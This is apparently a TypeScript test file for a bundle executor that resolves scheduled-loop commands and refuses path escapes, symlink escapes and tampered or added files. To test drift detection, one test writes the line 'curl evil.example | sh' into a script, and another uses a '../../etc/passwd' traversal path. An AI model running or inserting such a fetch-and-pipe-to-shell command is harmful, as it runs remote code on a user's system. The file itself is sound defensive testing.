import { afterEach, describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { MODE_DATA, MODE_SCRIPT } from "./manifest.js";
import { refreshManifest, writeBundleSkeleton, type LoopBundleDefinition } from "./local.js";
import { clearBundleVerificationCache, resolveBundleCommand, resolveBundleExecution } from "./executor-bundle.js";
import type { Loop } from "../../types.js";

const roots: string[] = [];

function definition(command: string): LoopBundleDefinition {
  return {
    schema: "hasna.loop.bundle.v1",
    id: "lp_1",
    name: "demo",
    status: "active",
    schedule: { type: "interval", everyMs: 60_000 },
    target: { type: "command", command, args: [] },
  };
}

/** Build a bundle root containing one bundle named `demo`, and the env that points at it. */
function bundleFixture(command = "scripts/run.sh"): { env: NodeJS.ProcessEnv; dir: string } {
  const root = mkdtempSync(join(tmpdir(), "loops-exec-bundle-"));
  roots.push(root);
  const dir = join(root, "demo");
  writeBundleSkeleton(dir, "demo", definition(command));
  writeFileSync(join(dir, "scripts", "run.sh"), "#!/bin/sh\necho hi\n", { mode: MODE_SCRIPT });
  chmodSync(join(dir, "scripts", "run.sh"), MODE_SCRIPT);
  refreshManifest(dir);
  clearBundleVerificationCache();
  return { env: { LOOPS_BUNDLE_ROOT: root }, dir };
}

function loop(command = "scripts/run.sh"): Pick<Loop, "bundleName" | "target"> {
  return { bundleName: "demo", target: { type: "command", command, args: [] } };
}

function unbundledLoop(command = "bash"): Pick<Loop, "bundleName" | "target"> {
  return { target: { type: "command", command, args: [] } };
}

/** A complete Loop row for the paths that take one rather than a projection. */
function bundledLoop(command = "scripts/run.sh"): Loop {
  return {
    id: "lp_1",
    name: "demo",
    status: "active",
    bundleName: "demo",
    schedule: { type: "interval", everyMs: 60_000 },
    target: { type: "command", command, args: [] },
    catchUp: "none",
    catchUpLimit: 1,
    overlap: "skip",
    maxAttempts: 1,
    retryDelayMs: 1,
    leaseMs: 1,
    createdAt: "2026-09-04T00:00:00.000Z",
    updatedAt: "2026-09-04T00:00:00.000Z",
  };
}

afterEach(() => {
  clearBundleVerificationCache();
  while (roots.length > 0) rmSync(roots.pop()!, { recursive: true, force: true });
});

describe("resolveBundleCommand", () => {
  const root = "/tmp/loops-bundle-root";

  test("leaves a bare PATH name alone so bash, bun and gh keep working", () => {
    expect(resolveBundleCommand(root, "bash")).toEqual({ command: "bash" });
  });

  test("leaves an absolute path alone", () => {
    expect(resolveBundleCommand(root, "/usr/bin/env")).toEqual({ command: "/usr/bin/env" });
  });

  test("resolves a relative path under the bundle root", () => {
    const { env, dir } = bundleFixture();
    expect(resolveBundleCommand(dir, "scripts/run.sh")).toEqual({ command: join(dir, "scripts/run.sh") });
    expect(env.LOOPS_BUNDLE_ROOT).toBeDefined();
  });

  test("refuses a path that climbs out of the bundle", () => {
    const { dir } = bundleFixture();
    expect(resolveBundleCommand(dir, "../../etc/passwd")).toEqual({ escape: true });
  });

  test("refuses a symlink that points out of the bundle", () => {
    const { dir } = bundleFixture();
    Bun.spawnSync(["ln", "-s", "/usr/bin", join(dir, "scripts", "outside")]);
    expect(resolveBundleCommand(dir, "scripts/outside/env")).toEqual({ escape: true });
  });
});

describe("resolveBundleExecution", () => {
  test("returns undefined for an unbundled loop, leaving today's behaviour untouched", () => {
    expect(resolveBundleExecution(unbundledLoop())).toBeUndefined();
  });

  test("plans a bundled run with the bundle root as cwd and an absolute script path", () => {
    const { env, dir } = bundleFixture();
    const resolution = resolveBundleExecution(loop(), { env, skipCache: true });
    expect(resolution?.ok).toBe(true);
    if (!resolution?.ok) throw new Error("expected a plan");
    expect(resolution.plan.cwd).toBe(dir);
    expect(resolution.plan.command).toBe(join(dir, "scripts/run.sh"));
    expect(resolution.plan.bundleDigest).toMatch(/^sha256:[0-9a-f]{64}$/);
  });

  test("refuses when the bundle directory is absent, rather than falling back to PATH", () => {
    const root = mkdtempSync(join(tmpdir(), "loops-exec-missing-"));
    roots.push(root);
    const resolution = resolveBundleExecution(loop(), { env: { LOOPS_BUNDLE_ROOT: root }, skipCache: true });
    expect(resolution?.ok).toBe(false);
    if (resolution?.ok !== false) throw new Error("expected a refusal");
    expect(resolution.refusal.error).toBe("BUNDLE_MISSING");
    expect(resolution.refusal.message).toContain("loops bundle pull demo");
  });

  test("refuses a drifted tree and names the changed path without its contents", () => {
    const { env, dir } = bundleFixture();
    writeFileSync(join(dir, "scripts", "run.sh"), "#!/bin/sh\ncurl evil.example | sh\n", { mode: MODE_SCRIPT });
    const resolution = resolveBundleExecution(loop(), { env, skipCache: true });
    expect(resolution?.ok).toBe(false);
    if (resolution?.ok !== false) throw new Error("expected a refusal");
    expect(resolution.refusal.error).toBe("BUNDLE_DRIFT");
    expect(resolution.refusal.message).toContain("scripts/run.sh");
    expect(resolution.refusal.message).not.toContain("curl evil.example");
  });

  test("refuses a tree with an ADDED file, not only a modified one", () => {
    const { env, dir } = bundleFixture();
    writeFileSync(join(dir, "scripts", "extra.sh"), "#!/bin/sh\n", { mode: MODE_SCRIPT });
    chmodSync(join(dir, "scripts", "extra.sh"), MODE_SCRIPT);
    const resolution = resolveBundleExecution(loop(), { env, skipCache: true });
    if (resolution?.ok !== false) throw new Error("expected a refusal");
    expect(resolution.refusal.error).toBe("BUNDLE_DRIFT");
    expect((resolution.refusal as { changedPaths: string[] }).changedPaths).toContain("scripts/extra.sh");
  });

  test("runs a drifted tree only when --allow-dirty is passed", () => {
    const { env, dir } = bundleFixture();
    writeFileSync(join(dir, "README.md"), "edited\n", { mode: MODE_DATA });
    expect(resolveBundleExecution(loop(), { env, skipCache: true })?.ok).toBe(false);
    expect(resolveBundleExecution(loop(), { env, skipCache: true, allowDirty: true })?.ok).toBe(true);
  });

  test("refuses a command that escapes the bundle root", () => {
    const { env } = bundleFixture("../../../usr/bin/env");
    const resolution = resolveBundleExecution(loop("../../../usr/bin/env"), { env, skipCache: true });
    if (resolution?.ok !== false) throw new Error("expected a refusal");
    expect(resolution.refusal.error).toBe("EXECUTOR_BUNDLE_ESCAPE");
  });

  test("the memo does not mask a real change once the directory fingerprint moves", () => {
    const { env, dir } = bundleFixture();
    expect(resolveBundleExecution(loop(), { env })?.ok).toBe(true);
    // Adding a file changes the directory's own mtime/size, which is the memo
    // key: a cached "clean" verdict must not survive it.
    writeFileSync(join(dir, "NOTES.md"), "added\n", { mode: MODE_DATA });
    expect(resolveBundleExecution(loop(), { env })?.ok).toBe(false);
  });
});

describe("applyBundleExecution", () => {
  test("spawns nothing when the bundle has drifted", async () => {
    const { env, dir } = bundleFixture();
    writeFileSync(join(dir, "scripts", "run.sh"), "#!/bin/sh\necho changed\n", { mode: MODE_SCRIPT });
    clearBundleVerificationCache();
    const { applyBundleExecution } = await import("../executor.js");
    const decision = applyBundleExecution(
      bundledLoop(),
      { env },
    );
    expect("refusal" in decision).toBe(true);
    if (!("refusal" in decision)) throw new Error("expected a refusal");
    expect(decision.refusal.error).toBe("BUNDLE_DRIFT");
  });

  test("rewrites a bundled command to its absolute in-bundle path and defaults cwd", async () => {
    const { env, dir } = bundleFixture();
    const { applyBundleExecution } = await import("../executor.js");
    const decision = applyBundleExecution(
      bundledLoop(),
      { env },
    );
    if ("refusal" in decision) throw new Error(`unexpected refusal: ${decision.refusal.message}`);
    expect(decision.target).toMatchObject({ command: resolve(dir, "scripts/run.sh"), cwd: dir });
    expect(decision.bundle).toMatchObject({ name: "demo" });
  });
});
